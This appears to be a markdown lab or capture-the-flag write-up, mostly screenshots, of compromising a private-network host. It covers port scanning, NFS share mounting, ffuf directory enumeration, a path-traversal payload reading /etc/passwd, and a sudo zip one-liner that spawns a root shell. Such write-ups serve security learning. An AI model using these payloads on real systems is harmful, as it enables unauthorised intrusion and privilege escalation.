
nmap -p- -A -T4 10.0.100.12


![dev-02](https://github.com/user-attachments/assets/af5eb5e8-a059-4d53-b347-504be26b68fa)


![dev-03](https://github.com/user-attachments/assets/2702c727-341c-4b90-b7b1-d844fae731b6)

![dev-04](https://github.com/user-attachments/assets/9be0108f-32bf-4984-85c6-86c84cc7b309)

![dev-06](https://github.com/user-attachments/assets/27345a58-46dc-412f-825e-aa93afd35dd4)


![dev-05](https://github.com/user-attachments/assets/a191e298-0c84-4c12-a847-432de94a3204)



![dev-07](https://github.com/user-attachments/assets/2ab951cc-a502-4469-af14-19906a5d1d16)



http://10.0.100.12:8080/


![dev-08](https://github.com/user-attachments/assets/5d9578ba-7eaf-4024-978a-fa4b8d716def)





## Network File Share (NFS)

/ show mount
# showmount -e 10.0.100.12


![dev-13](https://github.com/user-attachments/assets/50e77b15-1ee7-4ece-b184-7229fee60133)


/ make a directory to mount to:

# mkdir /mnt/dev

// call srv/nfs and put it in /mnt/dev

# mount -t nfs 10.0.100.12:/srv/nfs /mnt/dev

![dev-14](https://github.com/user-attachments/assets/81bd70ee-be9e-4848-81b3-7721f620cd68)


![dev-15](https://github.com/user-attachments/assets/cf31834e-b5b9-43db-8c87-2a2c66d960e6)


![dev-16](https://github.com/user-attachments/assets/505b15d4-e7f9-48b8-b013-16154d2b9a3e)


![dev-17](https://github.com/user-attachments/assets/c30e84ca-6607-412c-a047-78408011d63b)

unzip save.zip
ls


![dev-18](https://github.com/user-attachments/assets/170938ba-19b2-41df-addb-5d6f604352cc)



![dev-19](https://github.com/user-attachments/assets/47b56e64-ff12-4165-a48a-d3aaf084dfca)



![dev-20](https://github.com/user-attachments/assets/0bb5d39a-c307-41e8-a0f2-b23c61211688)


## Directory Enumeration using FFUF

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.100.12/FUZZ

![dev-09](https://github.com/user-attachments/assets/82a0a280-b1d0-428f-af33-2ea6f309054c)

![dev-10](https://github.com/user-attachments/assets/f03e523a-1bee-44ec-bfc0-8bddf6afe3af)


ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.100.12:8080/FUZZ
http://10.0.100.12:8080/dev/

![dev-11](https://github.com/user-attachments/assets/4a4642ae-03e0-428b-9560-642678dafb3c)


![dev-12](https://github.com/user-attachments/assets/45b2d5ea-9be2-4717-9e93-d2a3fd0dd3be)


http://10.0.100.12:8080/dev/




![dev-21](https://github.com/user-attachments/assets/9b9f249a-8c3c-4fd2-8a7f-a6d7845c9268)

![dev-22](https://github.com/user-attachments/assets/3ff3947c-780d-4886-94f3-ee6f4e5a271b)

![dev-23](https://github.com/user-attachments/assets/bdc0df37-5edc-4eb5-a95e-dc1496f865a8)

![dev-24](https://github.com/user-attachments/assets/4ed93379-a6a6-4623-ac64-913d61ff96ea)

![dev-25](https://github.com/user-attachments/assets/a93db737-bb92-4990-b148-04d19b03c9fd)


![dev-26](https://github.com/user-attachments/assets/314333f9-c904-4580-bad4-a67fb0500c3c)

![dev-27](https://github.com/user-attachments/assets/d94257d2-d458-4e77-8e5f-62c43e9eddc2)

![dev-28](https://github.com/user-attachments/assets/ffdbeab1-d904-4744-bccc-dfc36cc2120e)


![dev-29](https://github.com/user-attachments/assets/3da2a31e-abd6-49d4-946d-6de8ee5cd0e3)

![dev-30](https://github.com/user-attachments/assets/36feaba8-d3d5-4590-9f69-ac3353c58f57)

![dev-31](https://github.com/user-attachments/assets/f9b5f3be-a1a5-4e06-bebd-f44ce5d27aa3)

https://www.exploit-db.com/exploits/48411

![dev-32](https://github.com/user-attachments/assets/f511061a-5dfa-4ba9-ac60-f6da93e0dd5a)

## Local File Inclusion
![dev-33](https://github.com/user-attachments/assets/4b33a7c6-089c-471f-9378-08069e119821)


![dev-34](https://github.com/user-attachments/assets/e0f561bb-8263-4ef9-b79a-2341e46e573e)


action.search&action=../../../../../../../etc/passwd

![dev-35](https://github.com/user-attachments/assets/a12ca2e6-1ed9-4d16-99d2-68217758a9ef)


![dev-36](https://github.com/user-attachments/assets/913c7ccb-c72f-4e2a-8e7b-ef14227acdbc)


![dev-37](https://github.com/user-attachments/assets/9cd50a62-7e1a-4ca3-b0ba-ad3d5dec5fa7)


![dev-38](https://github.com/user-attachments/assets/00e0939f-04fd-49ba-8b64-a8f3817e1b7b)


![dev-39](https://github.com/user-attachments/assets/2d94a8fa-0a4b-4675-a655-758e476b4cfb)


![dev-40](https://github.com/user-attachments/assets/ee5fcad3-d031-4718-a336-0a0c367d678d)


![dev-41](https://github.com/user-attachments/assets/3b79df6c-a825-423a-8be9-872374569fe1)


## Privilege Escalation

![dev-42](https://github.com/user-attachments/assets/5d4105bb-e2fa-4279-b291-09c7d07bc0a0)

 
![dev-43](https://github.com/user-attachments/assets/fe7b1ec9-bb63-467a-859c-221ecebd82de)


TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
![dev-44](https://github.com/user-attachments/assets/1bf590a1-fb63-4002-b88a-a05a7da87788)



![dev-45](https://github.com/user-attachments/assets/3efe8be0-c30d-4386-aeb6-bf5ed3e70548)



